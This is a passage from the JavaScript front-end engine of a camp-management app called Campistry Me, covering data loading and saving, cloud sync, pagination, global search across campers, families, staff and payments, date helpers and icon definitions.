// campistry_me.js — Campistry Me Engine (Premium Rebuild)
(function(){
'use strict';
console.log('📋 Campistry Me loading...');

var COLORS=['#D97706','#147D91','#8B5CF6','#0EA5E9','#10B981','#F43F5E','#EC4899','#84CC16','#6366F1','#14B8A6'];
// Canonical real-world school grades — shared by Camp Structure's "which
// school grade(s) does this bunk group take?" mapping and by every place a
// parent or office picks a camper's actual grade (Registration form, Manual
// Entry, Edit Camper), so what a parent selects always matches exactly what
// a camp mapped a bunk group to — no free-text "1st" vs "1st Grade" drift.
var SCHOOL_GRADE_CATALOG=['Pre-K','Kindergarten','1st Grade','2nd Grade','3rd Grade','4th Grade','5th Grade','6th Grade','7th Grade','8th Grade','9th Grade','10th Grade','11th Grade','12th Grade'];
// The camp's own school-grade list (Bunk Settings → School Grades) once
// they've customized it, else the built-in default — every school-grade
// picker in the app reads through this, never SCHOOL_GRADE_CATALOG directly.
function _schoolGradeCatalog(){
    return (bunkGenConfig&&Array.isArray(bunkGenConfig.schoolGrades)&&bunkGenConfig.schoolGrades.length)?bunkGenConfig.schoolGrades:SCHOOL_GRADE_CATALOG;
}
// Options list for a school-grade <select> that also has to show an existing
// record's value even when it predates this catalog (free-text data from
// before this feature, or a value typed some other way) — otherwise opening
// Edit Camper would silently blank it out the moment nothing matches.
function _schoolGradeOptions(current){
    var cat=_schoolGradeCatalog();
    var opts=[''].concat(cat);
    if(current&&cat.indexOf(current)<0)opts.splice(1,0,current);
    return opts;
}
var AV_BG=['#147D91','#6366F1','#0EA5E9','#10B981','#F43F5E','#8B5CF6','#D97706'];

var structure={}, roster={}, families={}, payments=[], broadcasts=[], bunkAsgn={}, bunkManualCounts={}, bunkStaff={}, divisionHeads={};
var bunkCapacity={}; // max campers per bunk (capacity), keyed by bunk name — distinct from bunkManualCounts (headcount override)
var enrollments={}, sessions=[], enrollSettings={}, formConfig=null;
var finStaff=[], finExpenses=[], finPayments=[], finBudget={revenue:0,payroll:0,expenses:0}, finIntegrations={};
// Payroll — its own store, separate from the finance-tab staff list.
//   staff:      full payroll records (pay, addresses, documents, youthCorps)
//   timesheets: one row per person per week
//   youthCorps: the program-level worksite setup (see campistry_payroll_core.js)
//   payRuns:    committed pay periods
var payroll={staff:[],timesheets:[],youthCorps:{},payRuns:[],nextStaffId:1};
var _prTab='overview';   // overview | staff | timesheets | youth | runs
var _prWeek='';          // the week currently open on the Timesheets tab
var printSheets=[]; // custom printable-sheet templates (columns + grouping)
var savedReports=[]; // custom/saved reports: { id, name, source, fields, filters, groupBy, format, mode, snapshotRows, ... }
var curPage='campers', editingCamper=null, editingDiv=null, editingFam=null;
var _famHighlight=null; // camper name to scroll-to-and-highlight next time Families renders (set by viewFamilyFromCamper)
var _billHighlight=null; // family key to expand/scroll-to/highlight next time Billing renders (set by global search)
var _repHighlight=null;  // saved report id to scroll-to/highlight next time Reports renders (set by global search)
var PAGE_SIZE=50;
var _rosterPage=1, _billingPage=1, _analyticsInvoicePage=1, _analyticsPaymentPage=1;
// Slice an array to one page. Clamps pageNum into range so a stale page
// number (filter shrank the result set) never renders an empty page.
function _paginate(array,pageSize,pageNum){
    var total=array.length;
    var pages=Math.max(1,Math.ceil(total/pageSize));
    var page=Math.min(Math.max(1,pageNum||1),pages);
    var start=(page-1)*pageSize;
    return{items:array.slice(start,start+pageSize),page:page,pages:pages,total:total};
}
function _pagerHtml(total,pageSize,pageNum,onChangeFnName){
    var pages=Math.max(1,Math.ceil(total/pageSize));
    if(pages<=1)return '';
    var page=Math.min(Math.max(1,pageNum||1),pages);
    var start=total?((page-1)*pageSize+1):0;
    var end=Math.min(page*pageSize,total);
    var h='<div style="display:flex;align-items:center;gap:10px;padding:10px 2px;font-size:.78rem;color:var(--s500)">';
    h+='<span>Showing '+start+'–'+end+' of '+total+'</span><span style="flex:1"></span>';
    h+='<button class="me-btn me-btn--sec me-btn--sm"'+(page<=1?' disabled':'')+' onclick="CampistryMe.'+onChangeFnName+'('+(page-1)+')">Prev</button>';
    h+='<span>Page '+page+' of '+pages+'</span>';
    h+='<button class="me-btn me-btn--sec me-btn--sm"'+(page>=pages?' disabled':'')+' onclick="CampistryMe.'+onChangeFnName+'('+(page+1)+')">Next</button>';
    h+='</div>';
    return h;
}
function setRosterPage(n){_rosterPage=n;var inp=document.getElementById('globalSearch');renderCampers(inp?inp.value.trim():'');}
function setBillingPage(n){_billingPage=n;renderBilling();}
function setAnalyticsInvoicePage(n){_analyticsInvoicePage=n;renderAnalytics();}
function setAnalyticsPaymentPage(n){_analyticsPaymentPage=n;renderAnalytics();}
var pplStaffSubTab='applicants';  // Hiring page's own top tab: applicants | hired
var staffApplications={};   // Staff hiring: applicant id → application record
var staffFormConfig=null;   // Staff application form config — mirrors formConfig, drives campistry_staff_apply.html
var paFormConfig=null;      // Post-acceptance form config — mirrors formConfig, drives campistry_postaccept.html
var phFormConfig=null;      // Post-hire form config — mirrors paFormConfig, drives campistry_posthire.html
var counselorVisibility=null; // What counselors see in Lite; null = catalogue defaults
var _setupChecklistDismissed=false; // owner dismissed the onboarding progress card
var leads={};               // Inquiry CRM: lead id → prospective-family record
var leadFilter='all';       // Leads pipeline filter
var nextCamperId=1;
// Separate from payroll.nextStaffId (an internal id that only links
// timesheets/pay runs to payroll.staff records) — this is the camp-facing
// Staff ID, assigned once to every hired applicant the same way camperId
// is assigned once to every enrolled camper.
var nextStaffId=1;
// Bunk auto-generator settings — camp-wide policy for friend requests,
// do-not-bunk-with requests, and bunk size, consumed by autoGenerateBunks()
// and by the Post-Acceptance Form's friend-request inputs.
var bunkGenConfig=_defaultBunkGenConfig();
function _defaultBunkGenConfig(){
    return {
        requestsEnabled:true, maxRequests:2, honoredRequests:2,
        doNotBunkEnabled:true, maxDoNotBunk:2,
        minBunkSize:8, maxBunkSize:15,
        criteria:[
            {key:'school',label:'School',enabled:true},
            {key:'area',label:'Area / City',enabled:true},
            {key:'age',label:'Age',enabled:false}
        ],
        // Every camp's own list of real school grades — seeded from the
        // built-in default, but fully editable in Bunk Settings since camps
        // differ (Pre-K3/Pre-K4 split, non-US grade names, etc). Drives the
        // grade picker on Registration, Manual Entry, Edit Camper, and the
        // "School grade(s)" mapping chips in Camp Structure.
        schoolGrades:SCHOOL_GRADE_CATALOG.slice()
    };
}
var _saveLockUntil=0; // timestamp — block cloud overwrites for 5s after local save

// ═══ LOADING OVERLAY ═════════════════════════════════════════════
// The overlay is shown by default in the HTML so users never see a blank
// page during the IDB preload + cloud hydration window (~3–4s on a fresh
// load). We hide it only after the campistry-cloud-hydrated event has
// fired AND we've re-rendered with real data. A safety timeout hides it
// even if hydration never completes (e.g. fully offline) so the UI
// doesn't stay locked behind the spinner forever.
var _meOverlayHidden = false;
function hideMeLoadingOverlay(){
    if (_meOverlayHidden) return;
    _meOverlayHidden = true;
    var ov = document.getElementById('meLoadingOverlay');
    if (!ov) return;
    var elapsed = Date.now() - (window._meAnimStart || Date.now());
    var remaining = Math.max(0, 2000 - elapsed);
    setTimeout(function(){
        ov.classList.add('hide');
        setTimeout(function(){
            if (ov && ov.parentNode) ov.parentNode.removeChild(ov);
        }, 500);
    }, remaining);
}

// ═══ INIT ════════════════════════════════════════════════════════
function init(){
    loadData(); setupSidebar(); setupSearch(); setupModals();
    // Apply RTL if configured
    var cs=getCampSettings();
    if(cs.rtl) document.documentElement.setAttribute('dir','rtl');
    syncAllAddressesToGo();
    nav('campers');
    console.log('📋 Me ready:',Object.keys(roster).length,'campers');

    // Returning from Stripe Connect onboarding (started from Payroll → Tip
    // Payments, or resumed from Lite) — jump straight to that tab and
    // confirm the account's real status instead of waiting on the webhook.
    (function(){
        var params=new URLSearchParams(window.location.search);
        if(params.get('stripeReturn')!=='1')return;
        var accountId=params.get('accountId');
        history.replaceState(null,'',window.location.pathname+window.location.hash);
        _prTab='tips';
        nav('payroll');
        if(accountId)_ptCheckStripeReturn(accountId);
    })();

    // Sync UI with whatever's in _localCache after hydration. We ALWAYS reload
    // — the previous save-lock guard skipped loadData when the user had recent
    // local edits, intending to protect them from cloud overwrites. But:
    //   1) hydration only updates _localCache, never deletes data — so reading
    //      back out of _localCache is safe regardless of save lock state.
    //   2) localStorage writes can silently fail at quota, so a "recent local
    //      save" can be a fiction; skipping loadData stranded the UI on
    //      empty placeholder data.
    // If a save lock is active, ALSO trigger an explicit re-sync to push the
    // freshly-loaded local state back to cloud.
    window.addEventListener('campistry-cloud-hydrated',function(){
        var saveLockActive = Date.now() < _saveLockUntil;
        console.log('[Me] Cloud hydration — reloading data' + (saveLockActive ? ' (save lock active — also resaving)' : ''));
        // Section access: drop branches this user has no access to BEFORE
        // loadData() reads them, so restricted data never reaches the UI or the
        // on-device cache. preserveOnSave() puts them back at save time.
        _scrubRestrictedBranches();
        loadData();
        render(curPage);
        if (saveLockActive) {
            setTimeout(function(){ save(); }, 200);
        }
        // Data is now real — fade the overlay out.
        hideMeLoadingOverlay();
    });

    // Restricted branches are scrubbed from the shared settings blob in place.
    // Access resolution and cloud hydration race, so this runs on both events —
    // whichever lands second is the one that actually removes anything.
    function _scrubRestrictedBranches(){
        try{
            var S=window.CampistrySections;
            if(!S||!S.isReady()||S.isUnrestricted())return;
            var g=(typeof window.loadGlobalSettings==='function')?window.loadGlobalSettings():null;
            if(!g)return;
            S.scrubSettings(g);
        }catch(_){}
    }
    window.addEventListener('campistry-access-ready',function(){
        _scrubRestrictedBranches();
        loadData();
        render(curPage);
    });

    // Safety net: if hydration never fires (offline, no cloud config, etc.)
    // don't trap the user behind the spinner. After 12s, hide regardless —
    // the UI will show whatever loadData() managed to read locally.
    setTimeout(hideMeLoadingOverlay, 12000);

    // Watch for localStorage changes from other tabs/scripts
    window.addEventListener('storage',function(e){
        if(e.key==='campGlobalSettings_v1'&&Date.now()>=_saveLockUntil){
            console.log('[Me] External storage change — reloading');
            loadData();render(curPage);
        }
    });
}

// ═══ DATA ════════════════════════════════════════════════════════
function loadData(){
    try{
        // Prefer the in-memory cache (window.loadGlobalSettings → _localCache)
        // over a raw localStorage read. After hydrateFromCloud sets _localCache
        // to the cloud snapshot, localStorage may still hold the stale pre-edit
        // blob (when the localStorage write hit the quota). Reading localStorage
        // directly here would silently revert the page to the stale data.
        var s=null;
        if(typeof window.loadGlobalSettings==='function'){
            try{ s=window.loadGlobalSettings(); }catch(_){ s=null; }
        }
        if(!s||typeof s!=='object'){
            s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
        }
        structure=s.campStructure||{};
        roster=(s.app1&&s.app1.camperRoster)||{};
        var me=s.campistryMe||{};
        families=me.families||{}; payments=me.payments||[];
        broadcasts=me.broadcasts||[]; bunkAsgn=me.bunkAssignments||{}; bunkManualCounts=me.bunkManualCounts||{};
        bunkCapacity=me.bunkCapacity||{};
        bunkStaff=me.bunkStaff||{};
        divisionHeads=me.divisionHeads||{};
        enrollments=me.enrollments||{}; sessions=me.sessions||[]; enrollSettings=me.enrollSettings||{};
        staffApplications=me.staffApplications||{};
        leads=me.leads||{};
        counselorVisibility=(me.counselorVisibility&&typeof me.counselorVisibility==='object')?me.counselorVisibility:null;
        _setupChecklistDismissed=!!me.setupChecklistDismissed;
        formConfig=me.formConfig||null;
        staffFormConfig=me.staffFormConfig||null;
        paFormConfig=me.postAcceptFormConfig||null;
        phFormConfig=me.postHireFormConfig||null;
        bunkGenConfig=Object.assign(_defaultBunkGenConfig(),me.bunkGenConfig||{});
        if(!Array.isArray(bunkGenConfig.criteria)||!bunkGenConfig.criteria.length)bunkGenConfig.criteria=_defaultBunkGenConfig().criteria;
        if(!Array.isArray(bunkGenConfig.schoolGrades)||!bunkGenConfig.schoolGrades.length)bunkGenConfig.schoolGrades=_defaultBunkGenConfig().schoolGrades;
        printSheets=Array.isArray(me.printSheets)?me.printSheets:[];
        savedReports=Array.isArray(me.savedReports)?me.savedReports:[];
        var pr=me.payroll||{};
        payroll={
            staff:Array.isArray(pr.staff)?pr.staff:[],
            timesheets:Array.isArray(pr.timesheets)?pr.timesheets:[],
            youthCorps:(pr.youthCorps&&typeof pr.youthCorps==='object')?pr.youthCorps:{},
            payRuns:Array.isArray(pr.payRuns)?pr.payRuns:[],
            nextStaffId:pr.nextStaffId||1
        };
        // Every payroll record needs a stable id — timesheets and pay runs key
        // off it, so a record without one silently loses its hours.
        var maxSid=0;
        payroll.staff.forEach(function(s){if(s&&s.id>maxSid)maxSid=s.id});
        if(maxSid>=payroll.nextStaffId)payroll.nextStaffId=maxSid+1;
        payroll.staff.forEach(function(s){if(s&&!s.id){s.id=payroll.nextStaffId++}});
        // Ensure promoCodes live inside enrollSettings
        if(me.promoCodes&&!enrollSettings.promoCodes)enrollSettings.promoCodes=me.promoCodes;
        // Analytics & Finance
        var fin=me.finance||{};
        finStaff=fin.staff||[];finExpenses=fin.expenses||[];finPayments=fin.payments||[];
        finBudget=fin.budget||{revenue:0,payroll:0,expenses:0};finIntegrations=fin.integrations||{};
        nextCamperId=me.nextCamperId||1;
        // Backfill: assign IDs to any campers that don't have one
        var maxId=0;
        Object.values(roster).forEach(function(c){if(c.camperId&&c.camperId>maxId)maxId=c.camperId});
        if(maxId>=nextCamperId)nextCamperId=maxId+1;
        Object.entries(roster).forEach(function([n,c]){if(!c.camperId){c.camperId=nextCamperId;nextCamperId++}});
        nextStaffId=me.nextStaffId||1;
        // Backfill: any applicant already at "hired" from before this feature
        // shipped gets a Staff ID assigned now — same one-time-assignment
        // rule setStaffStatus uses going forward.
        var maxStaffId=0;
        Object.values(staffApplications).forEach(function(a){if(a&&a.staffId>maxStaffId)maxStaffId=a.staffId});
        if(maxStaffId>=nextStaffId)nextStaffId=maxStaffId+1;
        Object.values(staffApplications).forEach(function(a){if(a&&a.status==='hired'&&!a.staffId){a.staffId=nextStaffId;nextStaffId++}});
        // ★ Bunk Builder/Edit reconciliation: bunkAsgn (legacy Bunk Builder
        // drag-drop state) and roster[name].bunk (the field Edit, CSV import,
        // and Campistry Link all actually read) used to be two independent
        // stores that silently drifted apart — placing a camper in Bunk
        // Builder never updated roster.bunk, and editing roster.bunk via the
        // camper Edit modal never updated bunkAsgn, so each screen showed a
        // different placement. roster.bunk is now the single source of truth
        // (see renderBB/bbDrop/autoAssign) — backfill it here, once, for any
        // camper the old bunkAsgn already placed but whose roster record
        // never got the matching bunk field. Idempotent: once backfilled,
        // roster[name].bunk is truthy, so re-running this on later loads is a
        // no-op for that camper.
        Object.keys(bunkAsgn).forEach(function(bunkName){
            (bunkAsgn[bunkName]||[]).forEach(function(camperName){
                var c=roster[camperName];
                if(c&&!c.bunk){
                    c.bunk=bunkName;
                    var loc=_bunkDivGrade(bunkName);
                    if(loc){c.division=loc.div;c.grade=loc.gr}
                }
            });
        });
        // Post-Acceptance bunk requests land on the enrollment record
        // (enrollments[id].postAccept), not the roster — mirror them onto the
        // camper's own profile every load so Bunk Builder and Edit Camper show
        // them without anyone having to go dig up the original application.
        _syncPostAcceptBunkRequests();
        _syncCampTimezone();
    }catch(e){console.warn('[Me]',e)}
}
// The camp's timezone (used by the pickup-alert reminder — see migration
// 063/065) is picked up automatically from whoever's device loads Me, the
// same "just works, no settings field" spirit as Lite's weather card —
// except this needs no permission prompt at all: the browser already knows
// its own zone via Intl. Staff configuring the camp are assumed to be
// physically at (or local to) the camp, so their device's zone IS the
// camp's. Fire-and-forget, once per page load: the RPC itself is owner/
// admin-gated server-side, so a scheduler/viewer session loading Me just
// gets a harmless 'forbidden' back, silently ignored — same as this file's
// other best-effort background syncs.
var _tzSynced=false;
function _syncCampTimezone(){
    if(_tzSynced)return; _tzSynced=true;
    try{
        var tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
        if(!tz)return;
        var client=window.CampistryDB&&window.CampistryDB.getClient?window.CampistryDB.getClient():window.supabase;
        if(client&&client.rpc)client.rpc('set_camp_timezone',{p_timezone:tz}).then(function(){},function(){});
    }catch(e){}
}
function save(){
    try{
        _saveLockUntil=Date.now()+5000;
        // Read current state from the in-memory cache (IDB-backed via
        // integration_hooks). Falls back to localStorage if loadGlobalSettings
        // isn't installed yet.
        var g;
        if(typeof window.loadGlobalSettings==='function'){
            try{ g=Object.assign({},window.loadGlobalSettings()); }catch(_){ g=null; }
        }
        if(!g||typeof g!=='object'){
            try{ g=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}'); }catch(_){ g={}; }
        }
        g.campStructure=structure;
        if(!g.app1)g.app1={};
        g.app1.camperRoster=roster;
        // app1.divisions is owned exclusively by app1/Flow — it holds grade-keyed
        // entries built from campStructure (startTime, endTime, parentDivision, etc.).
        // campStructure is the authoritative source for division/grade/bunk structure;
        // app1.loadData() derives everything from it, so we must not overwrite it here.
        // ★★★ CB-60: SPREAD the existing campistryMe first, then override only
        // the keys this save() owns. The previous fixed object literal dropped
        // every sub-key NOT listed here — forms, customFields, locale,
        // campSettings, stripePublishableKey, etc. (each written by a sibling
        // saver) — so an unrelated save() silently wiped them from cache + cloud.
        // Section access: a user without Billing never had families/payments
        // hydrated (they were scrubbed after load). Writing g back as-is would
        // blank them in the cloud, so put the untouched branches back first.
        try{ if(window.CampistrySections)window.CampistrySections.preserveOnSave(g); }catch(_){}
        g.campistryMe=Object.assign({},(g.campistryMe&&typeof g.campistryMe==='object')?g.campistryMe:{},{
            families:families,
            payments:payments,
            broadcasts:broadcasts,
            bunkAssignments:bunkAsgn,
            bunkManualCounts:bunkManualCounts,
            bunkCapacity:bunkCapacity,
            bunkStaff:bunkStaff,
            divisionHeads:divisionHeads,
            nextCamperId:nextCamperId,
            nextStaffId:nextStaffId,
            enrollments:enrollments,
            staffApplications:staffApplications,
            leads:leads,
            counselorVisibility:counselorVisibility,
            sessions:sessions,
            enrollSettings:enrollSettings,
            formConfig:formConfig,
            staffFormConfig:staffFormConfig,
            postAcceptFormConfig:paFormConfig,
            postHireFormConfig:phFormConfig,
            bunkGenConfig:bunkGenConfig,
            printSheets:printSheets,
            savedReports:savedReports,
            setupChecklistDismissed:_setupChecklistDismissed,
            promoCodes:enrollSettings.promoCodes||(g.campistryMe?.promoCodes)||{},
            payroll:payroll,
            finance:{staff:finStaff,expenses:finExpenses,payments:finPayments,budget:finBudget,integrations:finIntegrations}
        });
        g.updated_at=new Date().toISOString();

        // saveGlobalSettings → setLocalSettings handles ALL persistence:
        //   - IndexedDB write-through with the FULL state (no quota)
        //   - localStorage write with a stripped sync-init snapshot
        //   - Per-key UPSERT into camp_state_kv
        // No direct localStorage writes needed from here anymore.
        var rosterCount=Object.keys(roster).length;
        if(window.saveGlobalSettings&&window.saveGlobalSettings._isAuthoritativeHandler){
            console.log('[Me] Saving',rosterCount,'campers,',Object.keys(enrollments).length,'enrollments,',sessions.length,'sessions');
            window.saveGlobalSettings('campStructure',structure);
            window.saveGlobalSettings('app1',g.app1);
            window.saveGlobalSettings('campistryMe',g.campistryMe);
            // Force-flush so a navigation immediately after import doesn't
            // race the debounced batch sync.
            if(typeof window.forceSyncToCloud==='function'){
                window.forceSyncToCloud();
            }
        }else{
            console.log('[Me] ⚠ saveGlobalSettings unavailable — local cache only');
        }
        // ★ Update starter-plan banner camper count in real time (trial_guard.js integration)
        if(typeof window.refreshStarterBanner==='function'){
            try{window.refreshStarterBanner(rosterCount)}catch(ex){}
        }
        // ★ Parent sign-up eligibility is roster-driven: any camper with a parent
        //   email makes that family claimable in the Link parent app the moment
        //   they're saved (debounced + signature-guarded, so repeat saves are free).
        try{_scheduleAutoParentInvites()}catch(ex){}
    }catch(e){
        console.error('[Me] Save:',e);
        // ★ #V2-7: surface the failure instead of swallowing it. A throw out of the
        //   save means even the LOCAL write failed (saveGlobalSettings is local-first:
        //   IDB has no quota + localStorage gets a stripped snapshot, so it normally
        //   absorbs transient cloud errors silently). A throw therefore means the
        //   user's edit may NOT be stored anywhere — they must be told, not left
        //   believing it saved (the silent-loss UX gap; #V2-1 quota intersection).
        try {
            var _msg = 'Save failed — your changes may not be stored. Check available storage and try again.';
            if (typeof toast === 'function') toast(_msg, 'error');
            else if (window.daShowAlert) window.daShowAlert(_msg);
            else if (typeof alert === 'function') alert(_msg);
        } catch(_) { /* last-resort: never let the error handler itself throw */ }
    }
}

// ═══ SIDEBAR ═════════════════════════════════════════════════════
function setupSidebar(){
    var h=document.getElementById('hamburgerBtn'),bd=document.getElementById('sidebarBackdrop'),sb=document.getElementById('sidebar');
    function open(){document.body.classList.add('sidebar-open')}
    function close(){document.body.classList.remove('sidebar-open')}
    if(h)h.onclick=function(){document.body.classList.contains('sidebar-open')?close():open()};
    if(bd)bd.onclick=close;
    if(sb)sb.querySelectorAll('.sidebar-item').forEach(function(b){b.onclick=function(){nav(b.dataset.page);close()}});
}
function nav(p){
    curPage=p;
    // A couple of sidebar entries each cover two pages, cross-linked via
    // their own in-page tabs — keep the one sidebar button highlighted on
    // either page: Structure (data-page="structure") also covers Bunk
    // Builder, Reports & Sheets (data-page="reports") also covers Print
    // Sheets, and Roster (data-page="campers") also covers Families.
    var sidebarKey=(p==='bunkbuilder')?'structure':(p==='printsheets')?'reports':(p==='camperdetail'||p==='staffdetail')?'campers':p;
    document.querySelectorAll('.sidebar-item').forEach(function(b){b.classList.toggle('active',b.dataset.page===sidebarKey)});
    document.querySelectorAll('.me-page').forEach(function(pg){pg.classList.toggle('active',pg.id==='page-'+p)});
    render(p);
}

// Cross-entity search: cheap substring match on name/label across the
// in-memory stores that actually hold identifiable people/records. Each
// result carries its own open() so the dropdown doesn't need to know how
// each entity type is best surfaced (a modal for some, a scroll-to for
// others that have no detail view yet).
var GLOBAL_SEARCH_TYPE_LABELS={camper:'Camper',family:'Family',staff:'Staff',payment:'Payment',report:'Report',lead:'Lead'};
function _globalSearchIndex(query){
    var q=(query||'').trim().toLowerCase();
    if(!q) return [];
    var results=[];
    function pushIfRoom(type,item){
        if(results.filter(function(r){return r.type===type}).length>=5) return;
        results.push(item);
    }
    Object.keys(roster).forEach(function(name){
        if(name.toLowerCase().indexOf(q)<0) return;
        var c=roster[name]||{};
        pushIfRoom('camper',{type:'camper',label:name,sublabel:[c.division,c.bunk].filter(Boolean).join(' · ')||'Camper',
            open:function(){nav('campers');setTimeout(function(){viewCamper(name)},50)}});
    });
    Object.keys(families).forEach(function(fk){
        var f=families[fk]||{};
        if(!f.name||f.name.toLowerCase().indexOf(q)<0) return;
        pushIfRoom('family',{type:'family',label:f.name,sublabel:(f.camperIds||[]).length+' camper'+((f.camperIds||[]).length!==1?'s':''),
            open:function(){
                var cn=(f.camperIds||[])[0];
                if(cn){viewFamilyFromCamper(cn);}
                else{nav('families');}
            }});
    });
    (payroll.staff||[]).forEach(function(s){
        if(!s||!s.name||s.name.toLowerCase().indexOf(q)<0) return;
        pushIfRoom('staff',{type:'staff',label:s.name,sublabel:s.role||'Staff',
            open:function(){nav('payroll');setTimeout(function(){prEditStaff(s.id)},50)}});
    });
    finPayments.forEach(function(p){
        if(!p||!p.family||p.family.toLowerCase().indexOf(q)<0) return;
        pushIfRoom('payment',{type:'payment',label:p.family+' — '+fm(p.amount||0),sublabel:[p.date,p.method].filter(Boolean).join(' · ')||'Payment',
            open:function(){
                _billHighlight=Object.keys(families).find(function(k){return families[k].name===p.family})||null;
                nav('billing');
            }});
    });
    savedReports.forEach(function(r){
        if(!r||!r.name||r.name.toLowerCase().indexOf(q)<0) return;
        pushIfRoom('report',{type:'report',label:r.name,sublabel:'Saved report',
            open:function(){_repHighlight=r.id;nav('reports');}});
    });
    Object.keys(leads).forEach(function(id){
        var l=leads[id]||{};
        var nm=l.parentName||l.camperName||'';
        if(!nm||nm.toLowerCase().indexOf(q)<0) return;
        pushIfRoom('lead',{type:'lead',label:nm,sublabel:l.camperName&&l.camperName!==nm?('Camper: '+l.camperName):'Lead',
            open:function(){nav('leads');setTimeout(function(){viewLead(id)},50)}});
    });
    return results;
}
function _globalSearchResultsHtml(results){
    if(!results.length) return '<div class="gs-empty">No matches</div>';
    var order=['camper','family','staff','payment','report','lead'],h='';
    order.forEach(function(type){
        var group=results.filter(function(r){return r.type===type});
        if(!group.length) return;
        h+='<div class="gs-group-label">'+GLOBAL_SEARCH_TYPE_LABELS[type]+'</div>';
        group.forEach(function(r,i){
            h+='<div class="gs-result" data-type="'+type+'" data-idx="'+i+'"><div class="gs-result-label">'+esc(r.label)+'</div>'+(r.sublabel?'<div class="gs-result-sub">'+esc(r.sublabel)+'</div>':'')+'</div>';
        });
    });
    return h;
}
function setupSearch(){
    var inp=document.getElementById('globalSearch');if(!inp)return;
    var dd=document.getElementById('globalSearchResults');
    var t,lastResults=[];
    function closeDD(){if(dd)dd.style.display='none'}
    function openDD(){if(dd)dd.style.display='block'}
    inp.oninput=function(){
        clearTimeout(t);
        var val=inp.value.trim();
        if(curPage==='campers'){_rosterPage=1;renderCampers(val);}
        t=setTimeout(function(){
            if(!val){lastResults=[];closeDD();return}
            lastResults=_globalSearchIndex(val);
            if(dd){dd.innerHTML=_globalSearchResultsHtml(lastResults);openDD()}
        },200);
    };
    inp.onfocus=function(){if(inp.value.trim()&&lastResults.length)openDD()};
    if(dd)dd.onclick=function(ev){
        var row=ev.target.closest('.gs-result');if(!row)return;
        var type=row.dataset.type;
        var group=lastResults.filter(function(r){return r.type===type});
        var r=group[Number(row.dataset.idx)];
        if(!r)return;
        closeDD();inp.value='';
        r.open();
    };
    document.addEventListener('click',function(ev){
        if(ev.target!==inp&&!(dd&&dd.contains(ev.target)))closeDD();
    });
    inp.addEventListener('keydown',function(ev){if(ev.key==='Escape'){closeDD();inp.blur()}});
}

// ═══ HELPERS ═════════════════════════════════════════════════════
function esc(s){var d=document.createElement('div');d.textContent=s;return d.innerHTML.replace(/"/g,'&quot;')}
function je(s){return esc(s).replace(/'/g,"\\'")}
function age(dob){if(!dob)return'';var a=Math.floor((Date.now()-new Date(dob).getTime())/31557600000);return a>=0&&a<25?a:''}

// ── Hebrew date conversion (Intl API — works in all modern browsers) ──
function toHebrewDate(isoDate){
    if(!isoDate) return'';
    try{
        var d=new Date(isoDate+'T12:00:00');
        if(isNaN(d.getTime())) return'';
        // Use Intl.DateTimeFormat with Hebrew calendar
        var fmt=new Intl.DateTimeFormat('he-IL-u-ca-hebrew',{day:'numeric',month:'long',year:'numeric'});
        return fmt.format(d);
    }catch(e){return''}
}

// ── Locale-aware date formatting ──
function getCampLocale(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    return(s.campistryMe&&s.campistryMe.locale)||'en-US';
}
function getCampSettings(){
    var s=JSON.parse(localStorage.getItem('campGlobalSettings_v1')||'{}');
    return(s.campistryMe&&s.campistryMe.campSettings)||{showHebrewDates:false,showAltNames:true,rtl:false};
}
function formatDateLocale(isoDate){
    if(!isoDate) return'';
    try{
        var d=new Date(isoDate+'T12:00:00');
        return d.toLocaleDateString(getCampLocale(),{month:'long',day:'numeric',year:'numeric'});
    }catch(e){return isoDate}
}
function ini(n){var p=n.split(' ');return((p[0]||'?')[0]+(p.length>1?(p[p.length-1]||'?')[0]:'')).toUpperCase()}
function avc(n){var h=0;for(var i=0;i<n.length;i++)h+=n.charCodeAt(i);return AV_BG[h%AV_BG.length]}
function av(n,sz){var w=sz==='l'?52:sz==='m'?38:28,fs=sz==='l'?17:sz==='m'?13:10;return'<div class="av av-'+(sz||'s')+'" style="background:'+avc(n)+'">'+esc(ini(n))+'</div>'}
function bdg(l,t){return'<span class="badge badge-'+t+'">'+esc(l)+'</span>'}

// Small inline icon set for the Registration row/Review-modal action
// buttons (Review/Enroll/Invite/Rescind) — replaces emoji-as-text, which
// renders inconsistently across platforms and reads as a placeholder
// rather than a real icon.
var _ICO={
    review:'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>',
    enroll:'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>',
    invite:'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>',
    rescind:'<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 012-2h4a2 2 0 012 2v2"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/></svg>',
    // Camper-profile card headers — same stroke-icon language as the
    // buttons above, just one size up (14px) since these sit next to text.
    user:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>',
    mapPin:'<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>',
